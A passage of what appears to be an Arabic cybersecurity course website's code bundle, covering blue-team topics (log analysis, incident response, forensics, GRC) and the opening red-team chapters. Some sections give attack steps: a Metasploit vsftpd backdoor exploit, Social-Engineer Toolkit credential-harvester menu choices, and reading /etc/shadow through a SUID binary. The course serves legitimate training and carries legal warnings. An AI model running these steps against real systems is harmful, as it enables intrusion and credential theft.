          <li><strong>سجلات لينكس:</strong> /var/log/auth.log، /var/log/syslog.</li>
        </ul>
        <div class="code-block">
# استعلام PowerShell لتحليل أحداث تسجيل الدخول الفاشلة
Get-EventLog -LogName Security -EntryType FailureAudit -Newest 20 | Format-Table -AutoSize

# في لينكس، البحث عن محاولات SSH الفاشلة
sudo grep "Failed password" /var/log/auth.log
        </div>
        <p>أدوات SIEM مفتوحة المصدر: <strong>ELK Stack (Elasticsearch, Logstash, Kibana)</strong>، <strong>Wazuh</strong>، <strong>Graylog</strong>.</p>
      `},{number:13,title:"[متوسط] تحليل الحزم باستخدام Wireshark و tcpdump",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث عشر: الغوص في حركة الشبكة</h2>
        <p>تحليل الحزم أداة أساسية لاكتشاف هجمات الشبكات وتحليل حركة المرور المشبوهة.</p>
        <div class="code-block">
# التقاط الحزم باستخدام tcpdump وحفظها في ملف
sudo tcpdump -i eth0 -s 1500 -w capture.pcap
# فتح الملف في Wireshark (واجهة رسومية) وفلترة الحزم
        </div>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">مرشحات Wireshark المفيدة:</h3>
        <ul>
          <li><code>http.request</code> – عرض طلبات HTTP فقط.</li>
          <li><code>tcp.port == 443</code> – اتصالات HTTPS.</li>
          <li><code>dns.qry.name contains "malware"</code> – البحث عن استعلامات DNS مشبوهة.</li>
          <li><code>tcp.flags.syn == 1 and tcp.flags.ack == 0</code> – محاولات إنشاء اتصال SYN (قد تشير إلى هجوم).</li>
        </ul>
      `},{number:14,title:"[متوسط] إدارة الثغرات وتطبيق التصحيحات",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع عشر: البقاء في مأمن من الثغرات المعروفة</h2>
        <p>إدارة الثغرات (Vulnerability Management) هي عملية دورية لاكتشاف الثغرات وتقييمها وعلاجها.</p>
        <ul>
          <li><strong>المسح الضوئي:</strong> استخدام أدوات مثل OpenVAS أو Nessus لفحص الأنظمة بحثاً عن ثغرات معروفة.</li>
          <li><strong>تحليل المخاطر:</strong> تحديد أولوية الثغرات بناءً على خطورتها (Critical, High, Medium, Low).</li>
          <li><strong>إدارة التصحيحات (Patch Management):</strong> تطبيق التحديثات الأمنية في الوقت المناسب.</li>
          <li><strong>إعادة الفحص للتأكد من الإصلاح.</strong></li>
        </ul>
        <div class="code-block">
# تثبيت OpenVAS (Greenbone Vulnerability Management) على Ubuntu
sudo apt install gvm -y
sudo gvm-setup
sudo gvm-check-setup
# بعد التثبيت، افتح المتصفح على https://127.0.0.1:9392 لبدء المسح.
        </div>
      `},{number:15,title:"[متوسط] مقدمة في الاستجابة للحوادث (Incident Response)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس عشر: ماذا تفعل بعد الاختراق؟</h2>
        <p>الاستجابة للحوادث هي عملية منظمة للتعامل مع الاختراقات. تعتمد على أطر مثل <strong>NIST SP 800-61</strong> أو <strong>SANS PICERL</strong>.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">مراحل PICERL:</h3>
        <ol>
          <li><strong>التحضير (Preparation):</strong> تجهيز الأدوات والفرق والخطط.</li>
          <li><strong>التحديد (Identification):</strong> اكتشاف الاختراق وجمع الأدلة الأولية.</li>
          <li><strong>الاحتواء (Containment):</strong> عزل الأنظمة المتأثرة لمنع انتشار الهجوم.</li>
          <li><strong>الاستئصال (Eradication):</strong> إزالة السبب الجذري للاختراق.</li>
          <li><strong>الاسترداد (Recovery):</strong> استعادة الأنظمة والبيانات من النسخ الاحتياطية.</li>
          <li><strong>الدروس المستفادة (Lessons Learned):</strong> توثيق الحادثة وتحسين الإجراءات.</li>
        </ol>
        <div class="note-box">
          📌 <strong>نشاط 15:</strong> اكتب خطة استجابة للحوادث مكونة من صفحة واحدة لمؤسسة صغيرة (5-10 موظفين). حدد فريق الاستجابة، أدوات الاتصال، وإجراءات الاحتواء الأولية.
        </div>
      `},{number:16,title:"[متوسط] مقدمة في التحليل الجنائي الرقمي (Digital Forensics)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس عشر: جمع الأدلة دون تدميرها</h2>
        <p>التحليل الجنائي الرقمي هو فرع من علوم الطب الشرعي يهتم بجمع وتحليل الأدلة الرقمية بطريقة مقبولة قانونياً.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">مبادئ أساسية:</h3>
        <ul>
          <li>لا تلمس القرص الأصلي – استخدم نسخة طبق الأصل (forensic image).</li>
          <li>توثيق كل إجراء (سلسلة الحفظ – Chain of Custody).</li>
          <li>استخدم أدوات متخصصة مثل Autopsy، FTK Imager، Volatility.</li>
        </ul>
        <div class="code-block">
# إنشاء صورة قرص باستخدام dd (لينكس)
sudo dd if=/dev/sdb of=/mnt/evidence/image.dd bs=4096
# حساب التجزئة للتأكد من سلامة الصورة
sha256sum /mnt/evidence/image.dd
        </div>
      `},{number:17,title:"[متوسط] تقييم المخاطر وإطار NIST CSF",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع عشر: كيف تقيم المخاطر بشكل منهجي؟</h2>
        <p>إطار NIST CSF (Cybersecurity Framework) يتكون من 5 وظائف أساسية: تحديد (Identify)، حماية (Protect)، كشف (Detect)، استجابة (Respond)، استرداد (Recover).</p>
        <p><strong>خطوات تقييم المخاطر العملية:</strong></p>
        <ol>
          <li>تحديد الأصول (الخوادم، قواعد البيانات، أجهزة الموظفين).</li>
          <li>تحديد التهديدات (هجمات إلكترونية، أخطاء بشرية، كوارث طبيعية).</li>
          <li>تقدير الاحتمالية والتأثير (من 1 إلى 5).</li>
          <li>حساب درجة المخاطرة (الاحتمالية × التأثير).</li>
          <li>تحديد خيارات المعالجة (تقليل، نقل، قبول، تجنب).</li>
        </ol>
        <div class="code-block">
# مثال على سجل المخاطر (Risk Register)
| Asset      | Threat          | Likelihood | Impact | Risk Score | Treatment        |
|------------|-----------------|------------|--------|------------|------------------|
| CRM DB     | SQL Injection   | 4          | 5      | 20         | Implement WAF    |
| Public WiFi | MitM Attack     | 3          | 4      | 12         | Use VPN          |
        </div>
      `},{number:18,title:"[متوسط] مراجعة المستوى الثاني واختبار",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن عشر: اختبار الفهم للمستوى المتوسط</h2>
        <ol>
          <li>اشرح ثغرة SQL Injection بمثال بسيط، واذكر طريقة الوقاية.</li>
          <li>ما الفرق بين IDS و IPS؟</li>
          <li>كيف يمكنك عرض آخر 10 أحداث فشل تسجيل دخول على ويندوز باستخدام PowerShell؟</li>
          <li>ما هي مراحل الاستجابة للحوادث وفق نموذج PICERL؟</li>
          <li>ما هي أهمية سلسلة الحفظ (Chain of Custody) في التحليل الجنائي؟</li>
          <li>اذكر مثالاً على تقييم مخاطر (احتمالية عالية وتأثير عالي) وكيف تعالجه.</li>
        </ol>
        <p><strong>المشروع العملي للمستوى الثاني:</strong> أنشئ بيئة مختبرية افتراضية (باستخدام VirtualBox) تتكون من جهاز أوبونتو وجهاز ويندوز. قم بتثبيت Snort على أوبونتو، وشغّل فحص nmap من جهاز آخر وحلل تنبيهات Snort. ثم التقط حزمة باستخدام tcpdump وافتحها في Wireshark. دوّن ملاحظاتك.</p>
      `},{number:19,title:"[متقدم] أتمتة المهام الأمنية باستخدام Python",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع عشر: كتابة أدواتك الأمنية</h2>
        <p>الأتمتة تزيد من كفاءة المحلل الأمني.</p>
        <div class="code-block">
# سكريبت بسيط لفحص المنافذ المفتوحة باستخدام بايثون
import socket

target = "192.168.1.1"
ports = [22, 80, 443, 3306]

for port in ports:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    result = sock.connect_ex((target, port))
    if result == 0:
        print(f"Port {port} is open")
    sock.close()
        </div>
        <div class="code-block">
# سكريبت للتحقق من وجود ملف في VirusTotal
import requests

api_key = "YOUR_VIRTUAL_TOTAL_API_KEY"
file_hash = "e4d7f1b4..."  # ضع تجزئة ملف حقيقي هنا
url = f"https://www.virustotal.com/api/v3/files/{file_hash}"
headers = {"x-apikey": api_key}
response = requests.get(url, headers=headers)
print(response.json())
        </div>
        <div class="note-box">
          📌 <strong>نشاط 19:</strong> قم بتثبيت بايثون على جهازك، وطبّق سكريبت فحص المنافذ على شبكتك المنزلية (بإذنك). جرّب تعديله لفحص نطاق من عناوين IP.
        </div>
      `},{number:20,title:"[متقدم] أمن السحابة والمبادئ الأساسية (Cloud Security)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل العشرون: حماية البيئات السحابية</h2>
        <p>مع التحول إلى السحابة (AWS، Azure، GCP)، يجب فهم نموذج المسؤولية المشتركة (Shared Responsibility Model).</p>
        <ul>
          <li><strong>المسؤولية عن أمن السحابة (Security of the Cloud):</strong> موفر السحابة مسؤول عن أمن البنية التحتية (مراكز البيانات، الشبكات، الأجهزة).</li>
          <li><strong>المسؤولية عن الأمن في السحابة (Security in the Cloud):</strong> العميل مسؤول عن تكوين الموارد، إدارة الهوية، تشفير البيانات، وتأمين التطبيقات.</li>
        </ul>
        <p>أدوات مراقبة السحابة: AWS CloudTrail، Azure Monitor، Google Cloud Logging. يمكن استخدام أدوات CSPM (Cloud Security Posture Management) مثل Prowler (مفتوح المصدر) للكشف عن التكوينات الخاطئة.</p>
        <div class="code-block">
# مثال: استخدام AWS CLI لتحليل سجلات CloudTrail
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=ConsoleLogin
        </div>
      `},{number:21,title:"[متقدم] هندسة الاجتماعيات وأدواتها (OSINT المتقدم)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الحادي والعشرون: استخبارات المصادر المفتوحة والهندسة الاجتماعية</h2>
        <p>جمع المعلومات من المصادر العامة (OSINT) خطوة حاسمة في اختبار الاختراق. الأدوات:</p>
        <ul>
          <li><strong>theHarvester:</strong> لجمع عناوين البريد الإلكتروني والنطاقات الفرعية.</li>
          <li><strong>Shodan:</strong> للبحث عن أجهزة متصلة بالإنترنت.</li>
          <li><strong>Maltego:</strong> لتحليل العلاقات بين البيانات.</li>
          <li><strong>Google Dorks:</strong> أوامر بحث متقدمة للعثور على معلومات حساسة (مثل: site:example.com filetype:pdf confidential).</li>
        </ul>
        <div class="code-block">
# جمع رسائل بريد إلكتروني لنطاق معين
theHarvester -d example.com -b google

# تثبيت وتشغيل Social-Engineer Toolkit (SET)
sudo apt install setoolkit -y
sudo setoolkit
# اختر 1) Social-Engineering Attacks
# ثم 2) Website Attack Vectors
# ثم 3) Credential Harvester Attack Method
        </div>
        <div class="warning-box">
          ⚠️ <strong>تنبيه أخلاقي:</strong> استخدم هذه الأدوات فقط على أهداف تملك الإذن باختبارها، أو على بيئتك الخاصة.
        </div>
      `},{number:22,title:"[متقدم] سياسات الأمن وإطار الحوكمة (GRC)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني والعشرون: بناء سياسات أمنية فعالة</h2>
        <p>السياسات هي الوثائق عالية المستوى التي تحدد أهداف الأمن ومبادئه. أمثلة على سياسات أساسية:</p>
        <ul>
          <li><strong>سياسة التحكم في الوصول (Access Control Policy).</strong></li>
          <li><strong>سياسة قبول المخاطر (Risk Acceptance Policy).</strong></li>
          <li><strong>سياسة الاستجابة للحوادث (Incident Response Policy).</strong></li>
          <li><strong>سياسة التصنيف والتعامل مع البيانات (Data Classification Policy).</strong></li>
        </ul>
        <div class="code-block">
# مثال على سياسة كلمات المرور:
- الحد الأدنى لطول كلمة المرور: 12 حرفًا.
- يجب أن تحتوي على أحرف كبيرة وصغيرة وأرقام ورموز.
- يتم تغيير كلمة المرور كل 90 يومًا.
- يمنع إعادة استخدام آخر 5 كلمات مرور.
- يتم تخزين كلمات المرور باستخدام تجزئة (hashing) مع ملح (salt).
        </div>
        <div class="note-box">
          📌 <strong>نشاط 22:</strong> اكتب مسودة لسياسة أمن المعلومات لمؤسسة صغيرة (لا تتجاوز صفحتين). تشمل: أهداف الأمن، نطاق التطبيق، الأدوار والمسؤوليات، إجراءات الإبلاغ عن الحوادث.
        </div>
      `},{number:23,title:"[متقدم] تحليل البرمجيات الخبيثة للمبتدئين (مقدمة)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث والعشرون: كيف تتعامل مع ملف مشبوه؟</h2>
        <p>تحليل المالفير (Malware Analysis) ينقسم إلى:</p>
        <ul>
          <li><strong>تحليل ساكن (Static):</strong> فحص الملف دون تشغيله (بحث عن سلاسل، فحص الهيدر، كشف الحزم).</li>
          <li><strong>تحليل ديناميكي (Dynamic):</strong> تشغيل الملف في بيئة معزولة ومراقبة السلوك (اتصالات الشبكة، تغييرات السجل، عمليات الملفات).</li>
        </ul>
        <div class="code-block">
# استخراج السلاسل النصية من ملف مشبوه (static)
strings suspicious.exe > strings.txt

# حساب تجزئة الملف
sha256sum suspicious.exe

# استخدام فيروس توتال API لفحص التجزئة
curl -s "https://www.virustotal.com/api/v3/files/$(sha256sum suspicious.exe | cut -d' ' -f1)" --header "x-apikey: YOUR_API_KEY"
        </div>
        <div class="note-box">
          📌 <strong>نشاط 23:</strong> اختر ملفاً تنفيذياً عادياً (غير ضار) من جهازك، وجرّب حساب تجزئته واستخراج السلاسل النصية منه. هل تجد أي شيء مثير للاهتمام (مثل أسماء دوال Windows API)؟
        </div>
      `},{number:24,title:"[متقدم] اختبار الاختراق الأخلاقي (مقدمة للممارسة القانونية)",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع والعشرون: كيف تبدأ في اختبار الاختراق؟</h2>
        <p>اختبار الاختراق الأخلاقي هو محاكاة هجمات حقيقية بإذن مسبق. مراحله:</p>
        <ol>
          <li><strong>جمع المعلومات (Reconnaissance):</strong> OSINT، مسح الشبكة.</li>
          <li><strong>المسح الضوئي (Scanning):</strong> Nmap، فتح المنافذ، اكتشاف الخدمات.</li>
          <li><strong>تحليل الثغرات (Vulnerability Analysis):</strong> استخدام OpenVAS أو Nessus.</li>
          <li><strong>الاستغلال (Exploitation):</strong> Metasploit أو سكريبتات مخصصة.</li>
          <li><strong>رفع الامتيازات (Post-Exploitation):</strong> الحصول على صلاحيات الجذر.</li>
          <li><strong>كتابة التقرير (Reporting):</strong> توثيق الثغرات والإصلاحات.</li>
        </ol>
        <div class="code-block">
# مثال: فحص المنافذ المفتوحة باستخدام Nmap
nmap -sS -p 1-1000 192.168.1.1
# اكتشاف نظام التشغيل والإصدارات
nmap -sV -O -A 192.168.1.1
        </div>
        <div class="warning-box">
          <i class="fas fa-gavel"></i> <strong>قانوني:</strong> لا تختبر أبداً نظاماً ليس لديك إذن كتابي باختباره. استخدم منصات تدريب قانونية مثل TryHackMe، HackTheBox، أو مختبرات افتراضية.
        </div>
      `},{number:25,title:"[متقدم] برامج مكافحة الثغرات (Bug Bounty) وكسب المال القانوني",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس والعشرون: حوافز لاكتشاف الثغرات</h2>
        <p>برامج مكافأة الثغرات (Bug Bounty) هي منصات قانونية تدفع مكافآت مالية لمن يكتشف ثغرات في أنظمة الشركات المشاركة. منصات مشهورة:</p>
        <ul>
          <li><strong>HackerOne</strong> – أكبر منصة عالمياً.</li>
          <li><strong>Bugcrowd</strong> – منصة شهيرة.</li>
          <li><strong>Intigriti</strong> – أوروبية.</li>
          <li><strong>برامج عربية:</strong> بعض الشركات العربية لديها برامج خاصة (ابحث عن "Bug Bounty" في منطقتك).</li>
        </ul>
        <p>كيف تبدأ؟</p>
        <ol>
          <li>أنشئ حساباً على المنصة.</li>
          <li>أكمل تدريباً أساسياً (مثل "Bug Bounty Hunter" من HackerOne).</li>
          <li>اختر برنامجاً مفتوحاً للمبتدئين (غالباً ذات نطاق محدود).</li>
          <li>اتبع قواعد البرنامج بدقة – لا تختبر خارج النطاق أبداً.</li>
          <li>دوّن الثغرات وقدم تقريراً واضحاً.</li>
        </ol>
        <div class="note-box">
          💰 <strong>معلومة:</strong> متوسط المكافأة لثغرة متوسطة الخطورة يتراوح بين 500 و 2000 دولار أمريكي. الثغرات الحرجة قد تصل إلى 10,000 دولار أو أكثر.
        </div>
      `},{number:26,title:"[متقدم] خطة التعلم لمدة 6 أشهر لتصبح محلل أمني",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس والعشرون: من أين تبدأ بعد هذا الكورس؟</h2>
        <p>إليك خطة زمنية مقترحة (6 أشهر) للانتقال من الصفر إلى وظيفة محلل أمني مبتدئ:</p>
        <ul>
          <li><strong>الشهر 1-2:</strong> إتقان أساسيات الشبكات وأنظمة التشغيل (ويندوز ولينكس). الحصول على شهادة CompTIA Network+ أو Security+.</li>
          <li><strong>الشهر 3-4:</strong> التدريب العملي على منصات مثل TryHackMe (مسار "Pre Security" و "SOC Level 1"). بناء مشروع صغير (مثل تركيب ELK Stack وتحليل سجلات محلية).</li>
          <li><strong>الشهر 5:</strong> التخصص في مسار معين (اختر: SOC Analyst، Red Team، Blue Team، GRC، Forensics، Malware). ادرس منهج متخصص.</li>
          <li><strong>الشهر 6:</strong> الحصول على شهادة معترف بها (مثل CompTIA Security+، BTL1، eJPT). بناء محفظة أعمال (على GitHub أو LinkedIn) تشمل مشاريعك.</li>
        </ul>
        <div class="note-box">
          🎯 <strong>هدف نهائي:</strong> بعد 6-12 شهراً من الالتزام، يمكنك التقدم لوظائف "Security Analyst" أو "SOC Analyst" في الشركات.
        </div>
      `},{number:27,title:"[متقدم] مراجعة المستوى الثالث والمشروع النهائي",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع والعشرون: اختبار المستوى المتقدم والمشروع الختامي</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>اكتب سكريبت بايثون يقوم بفحص ما إذا كان منفذ معين مفتوح على جهاز بعيد.</li>
          <li>ما الفرق بين Security of the Cloud و Security in the Cloud؟</li>
          <li>اذكر ثلاثة أنواع من Google Dorks المفيدة لجمع المعلومات.</li>
          <li>ما هي العناصر الأساسية التي يجب أن تتضمنها سياسة أمن المعلومات؟</li>
          <li>اشرح الفرق بين التحليل الساكن والديناميكي للمالفير.</li>
          <li>ما هي مراحل اختبار الاختراق الأخلاقي؟</li>
          <li>كيف يمكن كسب المال بشكل قانوني من اكتشاف الثغرات؟</li>
        </ol>
        <p><strong>المشروع النهائي (شامل):</strong></p>
        <ul>
          <li>أنشئ مختبراً افتراضياً يحتوي على جهازي لينكس وويندوز وجهاز مهاجم (Kali Linux).</li>
          <li>قم بتثبيت Snort IDS على أحد الأجهزة.</li>
          <li>استخدم Nmap لمسح الشبكة من جهاز المهاجم وسجل التنبيهات التي يولدها Snort.</li>
          <li>قم بتثبيت ELK Stack (أو Wazuh) على جهاز منفصل وجمع السجلات من أجهزة المختبر.</li>
          <li>اكتب تقريراً من 3-5 صفحات يشرح هيكل المختبر، الثغرات التي اكتشفتها، وكيفية إصلاحها.</li>
        </ul>
        <p>بعد إتمام هذا المشروع، ستكون قد طبقت تقريباً جميع المفاهيم التي تعلمتها في هذا الكورس.</p>
      `}]},lv={id:"red-team",title:"Red Team",emoji:"🔴",color:"red",description:"منهج متكامل من 3 مستويات - الهجوم الأخلاقي واختبار الاختراق",level:"مبتدئ / متوسط / متقدم",chaptersCount:27,pages:"~200 صفحة",icon:"fa-fist-raised",chapters:[{number:1,title:"[مبتدئ] مقدمة في الهكر الأخلاقي و Red Team",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الأول: ما هو الهكر الأخلاقي؟</h2>
        <p><strong>الهكر الأخلاقي (Ethical Hacking):</strong> استخدام مهارات القرصنة لاختبار أمن الأنظمة بإذن مسبق. الهدف هو اكتشاف الثغرات قبل أن يستغلها المخترقون الحقيقيون.</p>
        <p><strong>Red Team:</strong> فريق متخصص في محاكاة الهجمات الحقيقية لتقييم قدرة الدفاع لدى المؤسسة. يختلف عن اختبار الاختراق التقليدي في كونه أوسع (يشمل الهندسة الاجتماعية والهجمات المادية).</p>
        <p><strong>مراحل اختبار الاختراق القياسي (PTES - Penetration Testing Execution Standard):</strong></p>
        <ol>
          <li>جمع المعلومات (Information Gathering)</li>
          <li>المسح الضوئي (Scanning)</li>
          <li>استغلال الثغرات (Exploitation)</li>
          <li>رفع الامتيازات والثبات (Post-Exploitation)</li>
          <li>إزالة الأثر (Covering Tracks)</li>
          <li>كتابة التقارير (Reporting)</li>
        </ol>
        <div class="note-box">
          🔐 <strong>قاعدة ذهبية:</strong> لا تختبر أبداً نظاماً ليس لديك إذن كتابي باختباره. الالتزام بالأخلاقيات هو أساس هذا المجال.
        </div>
        <div class="warning-box">
          ⚠️ <strong>تنبيه قانوني:</strong> في مصر، قانون مكافحة الجرائم الإلكترونية رقم 175 لسنة 2018 يجرم الاختراق غير المصرح به ويعاقب بالحبس والغرامة.
        </div>
      `},{number:2,title:"[مبتدئ] تجهيز بيئة العمل - تثبيت Kali Linux والأدوات الأساسية",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثاني: إنشاء مختبر الاختراق الخاص بك</h2>
        <p>سنستخدم <strong>Kali Linux</strong> كتوزيعة أساسية لأنها تأتي محملة بأكثر من 600 أداة اختراق.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">طريقة التثبيت (على VirtualBox):</h3>
        <ul>
          <li>تحميل صورة Kali Linux من <a href="https://www.kali.org/get-kali/" target="_blank">الموقع الرسمي</a> (اختر الإصدار Installer Image).</li>
          <li>تثبيت VirtualBox وإنشاء جهاز افتراضي بمواصفات: 4GB RAM، 40GB قرص صلب، معالج ثنائي النواة.</li>
          <li>تثبيت Kali Linux واختيار بيئة XFCE (خفيفة وسريعة).</li>
          <li>بعد التثبيت، تحديث النظام وتثبيت الأدوات الإضافية.</li>
        </ul>
        <div class="code-block">
# تحديث Kali Linux
sudo apt update && sudo apt upgrade -y
sudo apt install kali-linux-headless   # تثبيت مجموعة الأدوات الأساسية
sudo apt install metasploit-framework nmap burpsuite sqlmap wireshark john -y
        </div>
        <div class="fig-box">
          <i class="fas fa-desktop text-neon text-2xl mb-2 block"></i>
          الشكل 2.1: واجهة Kali Linux بعد التثبيت
        </div>
        <div class="note-box">
          📌 <strong>نشاط 1:</strong> قم بتثبيت Kali Linux على جهاز افتراضي. تأكد من أنك تستطيع تشغيله والوصول إلى الطرفية (Terminal).
        </div>
      `},{number:3,title:"[مبتدئ] أساسيات الشبكات للمخترق الأخلاقي",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثالث: كيف تتحرك البيانات؟</h2>
        <p>فهم الشبكات هو أساس الاختراق.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">مفاهيم أساسية:</h3>
        <ul>
          <li><strong>عنوان IP (IPv4/IPv6):</strong> المعرف الفريد للجهاز على الشبكة.</li>
          <li><strong>المنافذ (Ports):</strong> نقاط دخول للخدمات (مثال: 80 HTTP، 443 HTTPS، 22 SSH).</li>
          <li><strong>TCP vs UDP:</strong> TCP موثوق (يستخدم للمتصفحات والبريد)، UDP أسرع (يستخدم للبث المباشر والألعاب).</li>
          <li><strong>DNS (Domain Name System):</strong> يحول الأسماء إلى عناوين IP.</li>
        </ul>
        <div class="code-block">
# أوامر لاستكشاف الشبكة من Kali
ip a                     # عرض واجهات الشبكة وعناوين IP
netstat -tulpn           # عرض المنافذ المفتوحة والخدمات
ping google.com          # اختبار الاتصال
traceroute google.com    # تتبع مسار الحزم
nslookup masry0-store.vercel.app   # استعلام DNS
        </div>
      `},{number:4,title:"[مبتدئ] أساسيات لينكس للمخترق",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الرابع: التحكم في نظام التشغيل</h2>
        <p>ستكون معظم أدوات الاختراق على لينكس، لذا يجب إتقان أساسياته.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">أوامر أساسية:</h3>
        <ul>
          <li><code>ls</code> – عرض الملفات والمجلدات.</li>
          <li><code>cd</code> – تغيير المجلد الحالي.</li>
          <li><code>pwd</code> – عرض المسار الحالي.</li>
          <li><code>mkdir</code> – إنشاء مجلد.</li>
          <li><code>rm</code> – حذف ملفات.</li>
          <li><code>chmod</code> – تغيير صلاحيات الملفات.</li>
          <li><code>sudo</code> – تنفيذ أمر بصلاحيات الجذر.</li>
          <li><code>grep</code> – البحث داخل النصوص.</li>
          <li><code>find</code> – البحث عن ملفات.</li>
        </ul>
        <div class="code-block">
# أمثلة عملية
whoami               # معرفة اسم المستخدم الحالي
sudo -l              # معرفة الأوامر المسموح بها
find / -perm -4000 2>/dev/null   # البحث عن ملفات SUID (قد تساعد في رفع الامتيازات)
ps aux | grep apache   # عرض عمليات Apache
        </div>
        <div class="note-box">
          📌 <strong>نشاط 2:</strong> جرب الأوامر أعلاه على جهاز Kali الخاص بك. أنشئ ملفاً نصياً، غيّر صلاحياته، وابحث عن نص بداخله باستخدام grep.
        </div>
      `},{number:5,title:"[مبتدئ] جمع المعلومات (OSINT) باستخدام أدوات بسيطة",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الخامس: معلومات مجانية – كيف تجمعها؟</h2>
        <p>جمع المعلومات (OSINT) هو أول مرحلة في أي اختبار اختراق. الهدف هو جمع أكبر قدر من البيانات عن الهدف من مصادر عامة.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">أدوات OSINT بسيطة:</h3>
        <ul>
          <li><strong>theHarvester:</strong> لجمع عناوين البريد الإلكتروني والنطاقات الفرعية.</li>
          <li><strong>whois:</strong> للحصول على معلومات عن مالك النطاق.</li>
          <li><strong>nslookup/dig:</strong> لاستعلام DNS.</li>
        </ul>
        <div class="code-block">
# أمثلة عملية
theHarvester -d example.com -b google
whois example.com
nslookup -type=MX example.com
dig example.com ANY
        </div>
        <div class="warning-box">
          ⚠️ <strong>تنبيه:</strong> جمع المعلومات من مصادر عامة مسموح به قانونياً، لكن لا تستخدمها لاختراق أنظمة لا تملك الإذن.
        </div>
        <div class="note-box">
          📌 <strong>نشاط 3:</strong> استخدم theHarvester لجمع معلومات عن نطاق شركة حقيقية (مثل microsoft.com). لاحظ كمية البيانات التي يمكن جمعها.
        </div>
      `},{number:6,title:"[مبتدئ] المسح الضوئي باستخدام Nmap – الأساسيات",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السادس: اكتشاف المنافذ والخدمات المفتوحة</h2>
        <p>Nmap هو أداة المسح الضوئي الأكثر شهرة. أوامر أساسية:</p>
        <div class="code-block">
# فحص سريع لأشهر 1000 منفذ
nmap 192.168.1.1

# فحص منافذ محددة
nmap -p 22,80,443 192.168.1.1

# فحص نطاق من عناوين IP
nmap 192.168.1.1-254

# فحص نصف اتصال (أسرع وأقل وضوحاً)
nmap -sS 192.168.1.1

# اكتشاف إصدارات الخدمات
nmap -sV 192.168.1.1
        </div>
        <div class="fig-box">
          <i class="fas fa-terminal text-neon text-2xl mb-2 block"></i>
          الشكل 6.1: نتيجة تشغيل Nmap تظهر المنافذ المفتوحة والخدمات
        </div>
        <div class="note-box">
          📌 <strong>نشاط 4:</strong> قم بمسح شبكتك المنزلية باستخدام Nmap. هل تتعرف على الأجهزة المتصلة؟ ما هي المنافذ المفتوحة؟
        </div>
      `},{number:7,title:"[مبتدئ] مقدمة إلى Metasploit – أول استغلال",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل السابع: الحصول على وصول أولي</h2>
        <p>Metasploit هو إطار عمل لاستغلال الثغرات. سنستخدمه لاختراق جهاز هدف ضعيف (على سبيل المثال، ثغرة vsftpd القديمة).</p>
        <div class="code-block">
# فتح Metasploit
msfconsole

# البحث عن ثغرة vsftpd
search vsftpd

# استخدام exploit
use exploit/unix/ftp/vsftpd_234_backdoor

# عرض الخيارات
show options

# تعيين عنوان IP للهدف
set RHOSTS 192.168.1.10

# تعيين الحمولة (payload)
set PAYLOAD cmd/unix/interact

# تنفيذ الاستغلال
exploit
        </div>
        <p>إذا نجح الاستغلال، ستحصل على جلسة shell. يمكنك تنفيذ أوامر على الجهاز الهدف.</p>
        <div class="warning-box">
          ⚠️ <strong>تنبيه:</strong> هذه الثغرة قديمة جداً ولا تعمل على الأنظمة الحديثة. استخدمها فقط في بيئة مختبرية آمنة (مثل Metasploitable).
        </div>
      `},{number:8,title:"[مبتدئ] رفع الامتيازات الأساسي – البحث عن SUID",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل الثامن: من مستخدم عادي إلى جذر</h2>
        <p>بعد الحصول على وصول أولي (عادة بصلاحيات محدودة)، نحتاج إلى رفع الامتيازات إلى الجذر (root) للتحكم الكامل.</p>
        <h3 class="font-bold text-neon/80 mt-4 mb-2">البحث عن ملفات SUID:</h3>
        <p>الملفات التي تحمل بت SUID يتم تشغيلها بصلاحيات مالك الملف (غالباً الجذر). يمكن استغلالها لرفع الامتيازات.</p>
        <div class="code-block">
# داخل جلسة shell (بعد الاستغلال)
find / -perm -4000 2>/dev/null
        </div>
        <p>إذا وجدت ملفاً مثل <code>/usr/bin/vim</code> أو <code>/usr/bin/nano</code>، يمكنك تشغيله لفتح ملف حساس مثل <code>/etc/shadow</code>.</p>
        <div class="code-block">
# مثال: استغلال vim SUID
/usr/bin/vim /etc/shadow
        </div>
      `},{number:9,title:"[مبتدئ] مراجعة المستوى الأول واختبار",content:`
        <h2 class="text-neon text-xl font-bold mb-4">الفصل التاسع: اختبار الفهم للمستوى المبتدئ</h2>
        <p>أجب عن الأسئلة التالية:</p>
        <ol>
          <li>ما الفرق بين الهكر الأخلاقي و Red Team؟</li>
          <li>ما هي مراحل اختبار الاختراق PTES؟</li>
          <li>كيف تقوم بتحديث Kali Linux عبر الطرفية؟</li>
